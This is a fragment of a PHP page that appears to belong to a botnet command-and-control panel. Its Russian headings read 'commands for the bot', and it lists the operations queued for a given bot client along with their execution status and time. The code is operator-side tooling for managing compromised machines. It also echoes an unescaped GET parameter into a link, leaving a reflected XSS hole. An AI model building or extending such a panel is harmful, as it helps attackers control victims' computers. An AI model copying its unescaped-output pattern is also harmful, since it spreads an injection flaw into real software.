        ...
        <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
            ...
            <div class="collapse navbar-collapse navbar-ex1-collapse">
                <ul class="nav navbar-nav side-nav">
                    ...
                    <li class="active">
                        <a href=""><i class="fa fa-fw fa-bug"></i> HTA</a>
                    </li>
                     <li>
                ...
                <div class="row">
                    <div class="col-lg-12">
                        ...
                        <ol class="breadcrumb">
                            ...
                            <li class="active">
                                <i class="fa fa-align-justify"></i> Команды для бота
                            </li>
                        </ol>
<!-- Таблица -->            
...
<?php
include ("../bd.php");
$client_id = mysqli_escape_string($link, $_GET['id']);
$query = mysqli_query($link,"SELECT `id`,`operation`,`argument_human`, `status`,`time` FROM `tasks` WHERE client_id='$client_id'");

if(ctype_digit($_GET['id'])==true){
    $bot = htmlspecialchars($_GET['id']);
}
else{
    $bot = "";
}
echo "
 <div class='col-lg-12'>
                        <h3>Команды для бота $bot </h3>
                        <div class='table-responsive'>
    <table class='table table-bordered table-hover table-striped'>
    <button style='background:white;border:1px solid #DDDDDD;text-decoration: none'><a href='../delete.php?id=1&user=".$_GET['id']."' style='color:#333333' onclick='return confirmDelete();'>Очистить таблицу</a></button>   
    <thead>
        <tr><th>ID</th><th>Операция</th><th>Команда</th><th>Статус выполнения</th><th>Время</th></tr>
    </thead>";

while($row = mysqli_fetch_array($query,MYSQLI_NUM)) {

$pole1=htmlspecialchars($row[0]);
$pole2=htmlspecialchars($row[1]);
$pole3=htmlspecialchars($row[2]);
$pole4=htmlspecialchars($row[3]);
$pole5=htmlspecialchars($row[4]);

echo "<tbody>
    <tr><td><a href='view_detail.php?id=$pole1&i=$client_id'>$pole1</td><td>$pole2</td><td>$pole3</td><td>$pole4</td><td>$pole5</td></tr>";
}
echo "</tbody></table>"
?>                        
